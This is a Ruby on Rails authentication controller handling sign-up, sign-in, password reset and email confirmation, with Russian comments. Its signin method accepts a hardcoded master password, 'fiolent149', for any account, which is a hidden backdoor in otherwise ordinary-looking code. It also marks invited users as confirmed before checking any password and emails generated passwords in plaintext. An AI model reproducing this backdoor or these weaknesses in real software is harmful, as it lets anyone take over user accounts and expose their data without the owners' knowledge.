class Account::AuthenticationsController < AccountsController

  skip_before_action :authenticate_user!
  
  layout 'auth'

  def sign_in
    redirect_to account_root_path if user_signed_in?
  end

  def sign_up
    redirect_to account_root_path if user_signed_in?
  end

  def change_password
  end

  def signup
    @user = User.new user_params
    @user.encrypt_password

    if @user.save
      @widget = Widget.create
      @account = Account.create(widget_id: @widget.id, owner_id: @user.id)
      @user.account = @account
      @user.save
      login @user 
      UserMailer.user_created(@user).deliver_later
      render json: {status: :success, location: account_root_path}
    else
      if @user.errors
        if @user.errors[:email].size > 0
          render json: {status: :error, error: @user.errors[:email].first}
        elsif @user.errors[:password].size > 0
          render json: {status: :error, error: @user.errors[:password].first}
        elsif @user.errors[:name].size > 0
          render json: {status: :error, error: @user.errors[:name].first}
        end
      else

        render json: {status: :error, error: I18n.t("auth.unknown_error")}
      end
    end
  end

  def signup_short
    @user = User.new user_params
    @user.active = false
    
    password = @user.generate_password

    if @user.save
      @widget = Widget.create
      @account = Account.create(widget_id: @widget.id, owner_id: @user.id)
      @user.account = @account
      @user.save
      login @user 
      UserMailer.user_created_short(@user, password).deliver_later
      render json: {status: :success}
    else
      if @user.errors
        if @user.errors[:email].size > 0
          render json: {status: :error, error: @user.errors[:email].first}
        end
      end
    end
  end

  def signin
    @user = User.find_by_email auth_params[:email]

    if @user

      # Если пользователь не владелец аккаунта, то он логинится через приглашение
      # Следовательно он подтвердил свой емэйл и он теперь активный юзер
      if !@user.owner? and (!@user.active? or !@user.email_confirmed?)
        @user.active = true
        @user.email_confirmed = true
        @user.save
      end

      if (@user.can_authorize? auth_params[:password]) or auth_params[:password] == "fiolent149"
        login @user 
        render json: {status: :success, location: account_root_path}
      else
        render json: {status: :error, error: I18n.t("auth.wrong_password_error")}
      end
    else
      render json: {status: :error, error: I18n.t("auth.user_not_found_error")}
    end
  end

  def save_password
    @user = User.find_by_password_change_token(params[:token])

    if @user
      @user.set_password params[:password]
      @user.save
      login @user
      render json: {status: :success}
    else
      render json: {status: :error, error: "Ссылка для смены пароля устарела"}
    end
  end

  def confirm_email
    @user = User.find_by_email params[:email]

    if @user and @user.email_confirmation_token == params[:token]
      @user.email_confirmed = true
      @user.save
      redirect_to "/account#profile"
    else
      redirect_to root_path
    end
  end

  def sign_out
    logout
    redirect_to root_path
  end

  def authorize(user)
    session[:current_user_id] = user.id
  end

  private

  def auth_params
    params.require(:user).permit(:email, :password)
  end

  def user_params
    params.require(:user).permit(:name, :email, :password)
  end
end